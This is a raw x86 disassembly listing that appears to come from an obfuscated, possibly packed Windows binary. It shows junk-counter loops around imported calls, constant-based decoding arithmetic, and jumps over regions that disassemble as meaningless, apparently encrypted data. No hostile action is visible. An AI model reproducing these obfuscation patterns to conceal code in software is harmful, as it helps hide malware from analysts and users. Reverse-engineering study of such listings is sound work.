  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	test   bl,cl
  407c4c:	add    bh,BYTE PTR [eax+0x7e7ecc2b]
  407c52:	add    eax,0x917e7e7c
  407c57:	mov    ss,esi
  407c59:	cli    
  407c5a:	mov    esi,0x5866d7a1
  407c5f:	sahf   
  407c60:	rcl    BYTE PTR [ebx],cl
  407c62:	mov    bl,0xfb
  407c64:	pushf  
  407c65:	push   ebx
  407c66:	ret    
  407c67:	rol    ebp,1
  407c69:	(bad)  
  407c6a:	jns    0x407cbf
  407c6c:	into   
  407c6d:	xor    eax,0x2aca6080
  407c72:	test   BYTE PTR [eax+0x42],dh
  407c75:	out    0x43,al
  407c77:	test   eax,0x463d88cd
  407c7c:	test   al,0xd8
  407c7e:	aaa    
  407c7f:	js     0x407c96
  407c81:	fcomi  st,st(0)
  407c83:	ret    
  407c84:	mov    dl,0x8b
  407c86:	cdq    
  407c87:	mov    es,WORD PTR [edi]
  407c89:	push   esi
  407c8a:	inc    edx
  407c8b:	js     0x407c5b
  407c8d:	fstp   TBYTE PTR cs:[edi+eiz*2]
  407c91:	adc    esp,DWORD PTR [eax]
  407c93:	sbb    al,0x8a
  407c95:	jmp    0x3638812a
  407c9a:	push   esi
  407c9b:	scas   eax,DWORD PTR es:[edi]
  407c9c:	js     0x407ccb
  407c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca0:	xchg   esp,eax
  407ca1:	xor    al,0x12
  407ca3:	icebp  
  407ca4:	(bad)  
  407ca5:	sbb    ebx,DWORD PTR [esi-0x30]
  407ca8:	mov    ebx,0xf38b9bbe
  407cad:	cmp    al,0x86
  407caf:	push   0x46755f2c
  407cb4:	sbb    ecx,DWORD PTR [esi+0x2acb85f6]
  407cba:	jbe    0x407cd3
  407cbc:	cmp    esp,DWORD PTR [ebx]
  407cbe:	push   0xffffffca
  407cc0:	ss xchg edi,eax
  407cc2:	dec    edi
  407cc3:	mov    BYTE PTR [ebx-0x46f696a1],bl
  407cc9:	dec    edx
  407cca:	ins    DWORD PTR es:[edi],dx
  407ccb:	and    al,0xdb
  407ccd:	pop    ss
  407cce:	scas   al,BYTE PTR es:[edi]
  407ccf:	mov    WORD PTR [ecx+0x2fc905f1],cs
  407cd5:	scas   eax,DWORD PTR es:[edi]
  407cd6:	pushf  
  407cd7:	xchg   edx,edi
  407cd9:	outs   dx,DWORD PTR ds:[esi]
  407cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cdb:	js     0x407cbd
  407cdd:	inc    edx
  407cde:	sbb    BYTE PTR [esi],bl
  407ce0:	adc    bl,cl
  407ce2:	mov    edx,0x10a8923e
  407ce7:	dec    edi
  407ce8:	pop    ss
  407ce9:	jne    0x407c9e
  407ceb:	dec    ebx
  407ced:	(bad)  
  407cee:	xlat   BYTE PTR ds:[ebx]
  407cef:	or     eax,0xc50236c3
  407cf4:	retf   0x209f
  407cf7:	mov    esp,0x64b7fb65
  407cfc:	adc    DWORD PTR [edi],ecx
  407cfe:	inc    esp
  407cff:	sahf   
  407d00:	stc    
  407d01:	jecxz  0x407d72
  407d03:	aad    0xce
  407d05:	ins    BYTE PTR es:[edi],dx
  407d06:	data16 jl 0x407d23
  407d09:	xor    ah,dl
  407d0b:	xor    BYTE PTR [ebx+0x12855341],0xc5
  407d12:	xor    eax,0x781fa7d9
  407d17:	fcmovnu st,st(4)
  407d19:	aaa    
  407d1a:	aam    0x6b
  407d1c:	loop   0x407ced
  407d1e:	dec    DWORD PTR [edx-0x5e]
  407d21:	inc    edx
  407d22:	mov    eax,0x72eeb5de
  407d27:	test   DWORD PTR [ecx+0x214e8d24],ebx
  407d2d:	or     al,0xb1
  407d2f:	xor    ch,BYTE PTR [ebp+ecx*4+0x10]
  407d33:	test   eax,0x245c47d3
  407d38:	xchg   BYTE PTR [esp+ebp*1-0x68],bl
  407d3c:	call   0xe67f:0xc0f59dc
  407d43:	test   edi,ebp
  407d45:	lds    esp,FWORD PTR [ecx-0x27368fd9]
  407d4b:	mov    edi,0xff4b3b36
  407d50:	add    ch,BYTE PTR [ecx]
  407d52:	les    edx,FWORD PTR [esi]
  407d54:	(bad)  [edx+0x78]
  407d57:	stos   DWORD PTR es:[edi],eax
  407d58:	dec    edi
  407d59:	sub    cl,BYTE PTR [edi]
  407d5b:	xor    ebp,edi
  407d5d:	inc    esi
  407d5e:	sahf   
  407d5f:	mov    bh,0x3d
  407d61:	push   esp
  407d62:	pop    esi
  407d63:	inc    ecx
  407d64:	mov    esp,0x5493d614
  407d69:	mov    WORD PTR [edx-0x4e],cs
  407d6c:	push   ecx
  407d6d:	jne    0x407d7f
  407d6f:	cdq    
  407d70:	imul   ebx,DWORD PTR ds:0x6c4ad35e,0x78
  407d77:	mov    dh,0x86
  407d79:	cdq    
  407d7a:	mov    ds:0xac2a39ba,al
  407d7f:	and    edx,ecx
  407d81:	rcr    DWORD PTR [eax+0x7c],1
  407d84:	outs   dx,DWORD PTR ds:[esi]
  407d85:	and    eax,0xc683f181
  407d8a:	retf   
  407d8b:	xchg   esi,eax
  407d8c:	les    eax,FWORD PTR [esp+eiz*4+0x73]
  407d90:	pop    ecx
  407d91:	leave  
  407d92:	xlat   BYTE PTR ds:[ebx]
  407d93:	sti    
  407d94:	adc    al,0x38
  407d96:	retf   0x3903
  407d99:	imul   edx,DWORD PTR [esi],0x4a
  407d9c:	mov    edx,0x32a4ba67
  407da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da2:	lea    edx,[ebx-0x36e52434]
  407da8:	cmp    WORD PTR [edi+0x18],bp
  407dac:	(bad)  
  407dad:	fistp  QWORD PTR [esi]
  407daf:	mov    eax,?
  407db1:	jo     0x407d81
  407db3:	sahf   
  407db4:	(bad)  [edx+0x2a]
  407db7:	icebp  
  407db8:	dec    ecx
  407db9:	adc    BYTE PTR [ebp+0x7f],bl
  407dbc:	stc    
  407dbd:	dec    ecx
  407dbe:	(bad)  
  407dbf:	pushf  
  407dc0:	or     esi,DWORD PTR [ecx]
  407dc2:	popf   
  407dc3:	cmp    ebx,DWORD PTR [esi]
  407dc5:	fild   QWORD PTR [edx-0x44]
  407dc8:	mov    edi,0x8456b88
  407dcd:	ret    
  407dce:	mov    eax,0xf48baa73
  407dd3:	in     eax,dx
  407dd4:	cmp    esp,ecx
  407dd6:	addr16 jg 0x407da0
  407dd9:	jl     0x407d82
  407ddb:	push   esp
  407ddc:	jl     0x407db0
  407dde:	int    0x2c
  407de0:	in     eax,dx
  407de1:	jle    0x407dbb
  407de3:	xchg   ecx,eax
  407de4:	add    eax,edi
  407de6:	out    dx,al
  407de7:	push   es
  407de8:	retf   0x1151
  407deb:	dec    edx
  407dec:	sbb    BYTE PTR [ecx+0x251d338e],cl
  407df2:	jno    0x407d80
  407df4:	lahf   
  407df5:	push   esi
  407df6:	fmul   DWORD PTR [ebx-0x3a]
  407df9:	inc    edi
  407dfa:	push   edi
  407dfb:	or     bl,cl
  407dfd:	xor    ch,dl
  407dff:	dec    esp
  407e00:	aas    
  407e01:	jmp    0xd8f7:0xc87fa79c
  407e08:	ss pop ecx
  407e0a:	adc    eax,0x1f23969b
  407e0f:	push   es
  407e10:	mov    WORD PTR [edi-0x1540ff19],ds
  407e16:	push   edx
  407e17:	in     al,0x66
  407e19:	push   0x17894e2c
  407e1e:	data16 lods al,BYTE PTR ds:[esi]
  407e20:	lgs    ecx,FWORD PTR [esi-0x2f25f968]
  407e27:	mov    ebx,0x3ae7cfd0
  407e2c:	cmp    DWORD PTR [esi+0x69],ebx
  407e2f:	pop    ebx
  407e30:	or     ah,0xf3
  407e33:	pop    esi
  407e34:	add    BYTE PTR [ebx+0x6a8de47e],bl
  407e3a:	mov    ebp,0x64b25c1a
  407e3f:	in     al,dx
  407e40:	hlt    
  407e41:	xchg   BYTE PTR [ecx],dh
  407e43:	adc    DWORD PTR [eax-0x6004a2e8],ebp
  407e49:	mov    bh,BYTE PTR [ecx+0x2e]
  407e4c:	fdivp  st(1),st
  407e4e:	fwait
  407e4f:	rcr    BYTE PTR [ecx-0x7dc0298],cl
  407e55:	rcl    bl,0xf0
  407e58:	fwait
  407e59:	mov    eax,0x2f8ecc7
  407e5e:	arpl   WORD PTR [esi+0x53],bp
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x6917c60d
  408191:	enter  0xca3e,0x7e
  408195:	jle    0x4081bb
  408197:	jl     0x408217
  408199:	jle    0x408180
  40819b:	mov    ?,ebp
  40819d:	leave  
  40819e:	sahf   
  40819f:	ss inc ebx
  4081a1:	inc    edi
  4081a2:	xchg   bl,dh
  4081a4:	mov    gs,WORD PTR [edi]
  4081a6:	xchg   BYTE PTR [eax],cl
  4081a8:	xchg   ecx,eax
  4081a9:	inc    ebp
  4081aa:	mov    al,ds:0xaba6fbb5
  4081af:	adc    eax,0x83a51742
  4081b4:	(bad)  
  4081b5:	pop    ss
  4081b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b7:	lock (bad) [esi-0x7362a790]
  4081be:	in     eax,dx
  4081bf:	inc    esp
  4081c0:	dec    edi
  4081c1:	je     0x408192
  4081c3:	sbb    DWORD PTR [ebx],eax
  4081c5:	push   ebx
  4081c6:	pop    edi
  4081c7:	loopne 0x408206
  4081c9:	cmp    al,0x6a
  4081cb:	retf   0x3625
  4081ce:	dec    ebx
  4081cf:	icebp  
  4081d0:	aad    0xe8
  4081d2:	fldenv [ebx+0x17]
  4081d5:	stc    
  4081d6:	cmp    al,0x43
  4081d8:	dec    ebp
  4081d9:	mov    DWORD PTR [ebx],edi
  4081db:	cdq    
  4081dc:	and    al,0xea
  4081de:	sbb    dh,BYTE PTR [edi+0x21]
  4081e1:	push   eax
  4081e2:	sub    eax,0xa7688f10
  4081e7:	xor    al,0x57
  4081e9:	arpl   WORD PTR [eax-0x72a103f4],bx
  4081ef:	inc    ecx
  4081f0:	das    
  4081f1:	jle    0x408258
  4081f3:	retf   
  4081f4:	cs ret 0xf2e6
  4081f8:	xchg   edi,eax
  4081f9:	(bad)  
  4081fb:	or     dl,BYTE PTR [edx-0x1e287d6e]
  408201:	ss dec ebx
  408203:	outs   dx,BYTE PTR ds:[esi]
  408204:	ret    0xe54d
  408207:	sbb    DWORD PTR [edx+0x56],0x33
  40820b:	xlat   BYTE PTR ds:[ebx]
  40820c:	dec    edx
  40820d:	push   ebp
  40820e:	cld    
  40820f:	push   WORD PTR [ebx]
  408212:	pop    esp
  408213:	adc    edi,DWORD PTR [eax-0x2c]
  408216:	or     al,0x2
  408218:	mov    DWORD PTR [edi*4-0x15426ce4],0x67139d61
  408223:	dec    ebp
  408224:	pop    eax
  408225:	mov    es,ebx
  408227:	sbb    bl,cl
  408229:	les    eax,FWORD PTR ds:0x4ba5d258
  40822f:	addr16 jmp 0xe645:0x47cab93f
  408237:	mov    DWORD PTR [esi],esi
  408239:	sbb    eax,0x5fd34c6b
  40823e:	jl     0x40823b
  408240:	pop    esp
  408241:	jmp    0xbc5d83c4
  408246:	shr    DWORD PTR [ecx+0x2b],cl
  408249:	lds    ecx,FWORD PTR [edi-0x4c7c088b]
  40824f:	pop    eax
  408250:	cmp    ebp,edx
  408252:	(bad)  
  408254:	shl    cl,cl
  408256:	aas    
  408257:	daa    
  408258:	adc    DWORD PTR [edx-0x181d3294],edi
  40825e:	dec    edi
  40825f:	mov    esi,ss
  408261:	jae    0x408241
  408263:	sub    dh,BYTE PTR [eax]
  408265:	inc    edx
  408266:	cmp    al,0x8c
  408268:	leave  
  408269:	loope  0x408276
  40826b:	(bad)  
  40826c:	pop    edi
  40826d:	jmp    DWORD PTR [edx+eiz*2-0x4c]
  408271:	(bad)  
  408272:	xor    ah,cl
  408274:	and    BYTE PTR [edx-0xc989c29],bl
  40827a:	ja     0x40821f
  40827c:	mov    ds:0x42886376,eax
  408281:	test   DWORD PTR [edx+0x22],ecx
  408284:	in     eax,dx
  408285:	ror    BYTE PTR [esi-0x49ce1408],0x81
  40828c:	ja     0x408226
  40828e:	jo     0x4082b2
  408290:	pushf  
  408291:	push   esi
  408292:	(bad)  
  408293:	loopne 0x408281
  408295:	sar    DWORD PTR [ebp+0x12],cl
  408298:	ja     0x408237
  40829a:	sub    eax,0xe746ea2
  40829f:	not    DWORD PTR [edx]
  4082a1:	sbb    ebp,ebx
  4082a3:	loop   0x408272
  4082a5:	push   ds
  4082a6:	dec    esp
  4082a7:	pop    eax
  4082a8:	pushf  
  4082a9:	dec    esi
  4082aa:	fisub  DWORD PTR [edx-0x19]
  4082ad:	pop    ebx
  4082ae:	stos   BYTE PTR es:[edi],al
  4082af:	mul    eax
  4082b1:	inc    esp
  4082b2:	scas   al,BYTE PTR es:[edi]
  4082b3:	cmp    ebx,DWORD PTR [edx-0x1f]
  4082b6:	xor    eax,0xd24d4d16
  4082bb:	test   DWORD PTR [edi-0x6f],ecx
  4082be:	(bad)  
  4082bf:	mov    ebp,0x2ead1bae
  4082c4:	inc    eax
  4082c5:	adc    al,0x36
  4082c7:	loop   0x40828a
  4082c9:	aad    0xda
  4082cb:	lahf   
  4082cc:	add    BYTE PTR [esp+eiz*2-0x25],0x3a
  4082d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d2:	icebp  
  4082d3:	push   ecx
  4082d4:	into   
  4082d5:	and    BYTE PTR [esi-0xf],cl
  4082d8:	clc    
  4082d9:	jmp    0x5dc96b8f
  4082de:	dec    esp
  4082df:	or     cl,BYTE PTR [edi+ecx*4+0x37]
  4082e3:	jle    0x408298
  4082e5:	inc    esp
  4082e6:	call   0xc2bc:0x8612e71e
  4082ed:	mov    bh,0x86
  4082ef:	lahf   
  4082f0:	pusha  
  4082f1:	aam    0xb0
  4082f3:	bound  ebx,QWORD PTR [ebp-0x75c9623d]
  4082f9:	test   DWORD PTR [ebx],edi
  4082fb:	enter  0x251b,0x53
  4082ff:	imul   esp,DWORD PTR [ecx],0xd33d93f1
  408305:	push   edx
  408306:	cmp    edi,DWORD PTR [ebp+0x1f7b3767]
  40830c:	(bad)  
  40830d:	neg    DWORD PTR [esi-0x28793ec8]
  408313:	stos   DWORD PTR es:[edi],eax
  408314:	dec    esp
  408315:	mov    ebx,0x818ff821
  40831a:	in     al,0xfc
  40831c:	stc    
  40831d:	rcr    ebx,cl
  40831f:	sbb    bl,dl
  408321:	fstp   TBYTE PTR [ecx-0x55]
  408324:	adc    BYTE PTR [esi+0x3fd8bb9a],cl
  40832a:	xor    BYTE PTR [ecx],dh
  40832c:	fild   WORD PTR ds:0x78f95f60
  408332:	sub    eax,0x9c0e1e
  408337:	fst    QWORD PTR [eax+ecx*1-0x42]
  40833b:	jge    0x408324
  40833d:	push   ss
  40833e:	enter  0x8dca,0xc1
  408342:	jmp    0x408353
  408344:	mov    ds:0xdfd0a4e5,al
  408349:	add    DWORD PTR [ebp-0x1a8b9a10],esp
  40834f:	sbb    BYTE PTR [ebx+ecx*8],al
  408352:	jne    0x4083cf
  408354:	sbb    esi,eax
  408356:	cld    
  408357:	jmp    0xd181:0x75b85605
  40835e:	mov    ebp,esp
  408360:	push   dx
  408362:	ins    BYTE PTR es:[edi],dx
  408363:	sub    edx,esi
  408365:	mov    ah,BYTE PTR [esi+eax*2-0x2f3b69d7]
  40836c:	adc    DWORD PTR [ebp-0x6a6ad56e],esp
  408372:	mov    eax,ds:0x1f7bfc5a
  408377:	out    dx,eax
  408378:	fnstcw WORD PTR [ecx]
  40837a:	xchg   ebp,eax
  40837b:	cld    
  40837c:	mov    cl,0x5c
  40837e:	adc    al,0x96
  408380:	push   edi
  408381:	stos   DWORD PTR es:[edi],eax
  408382:	jnp    0x40831d
  408384:	mov    ss,WORD PTR [eax]
  408386:	out    dx,eax
  408387:	jp     0x40831a
  408389:	test   DWORD PTR [ecx-0x2a2d18c6],ecx
  40838f:	dec    esi
  408390:	pop    edi
  408391:	cmc    
  408392:	or     ecx,ebp
  408394:	or     dl,BYTE PTR [esp+eiz*8+0x335d4d9a]
  40839b:	xchg   BYTE PTR [esi+0x155e3393],ah
  4083a1:	es ins DWORD PTR es:[edi],dx
  4083a3:	inc    ebx
  4083a4:	cmp    esp,DWORD PTR [ebx]
  4083a6:	les    esp,FWORD PTR [ecx+0x75516cdc]
  4083ac:	stos   DWORD PTR es:[edi],eax
  4083ad:	add    dl,BYTE PTR [esi-0x24c09515]
  4083b3:	or     BYTE PTR [ebp-0x67],cl
  4083b6:	cdq    
  4083b7:	jge    0x4083a7
  4083b9:	xchg   ecx,eax
  4083ba:	gs cs das 
  4083bd:	in     al,dx
  4083be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083bf:	adc    al,0xed
  4083c1:	mov    bh,0xf
  4083c3:	imul   ecx,DWORD PTR [ecx+0x2581e045],0x43375b
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	sbb    DWORD PTR [esi],eax
  408466:	sbb    bh,al
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	xor    DWORD PTR ds:0xccb0f0eb,ecx
  408476:	sbb    al,0xa3
  408478:	pop    eax
  408479:	mov    dl,BYTE PTR [ebp+0x4747dc0b]
  40847f:	or     BYTE PTR [ebx],al
  408481:	sbb    eax,DWORD PTR [edi+0x54]
  408484:	into   
  408485:	ss aaa 
  408487:	mov    esp,0x62a1e675
  40848c:	add    eax,0x52b4d16e
  408491:	jns    0x40849c
  408493:	jb     0x408454
  408495:	fsubr  QWORD PTR [esi+0x362e642a]
  40849b:	aas    
  40849c:	inc    ecx
  40849d:	loope  0x40849a
  40849f:	(bad)  
  4084a0:	nop
  4084a1:	pop    edx
  4084a2:	ret    0x4b1f
  4084a5:	pop    ss
  4084a6:	(bad)  
  4084a8:	rcr    DWORD PTR [eax+0x1db4a83],cl
  4084ae:	pop    ebx
  4084af:	call   0x9cee:0xbe179d6b
  4084b6:	pop    ecx
  4084b7:	xor    eax,DWORD PTR [edx-0x3ec9913b]
  4084bd:	jg     0x408473
  4084bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084c0:	adc    al,0x41
  4084c2:	mov    ebp,0x6ba11c4b
  4084c7:	xchg   edx,eax
  4084c8:	cmp    DWORD PTR [ecx-0xb39c7c6],ecx
  4084ce:	fisttp WORD PTR [ecx]
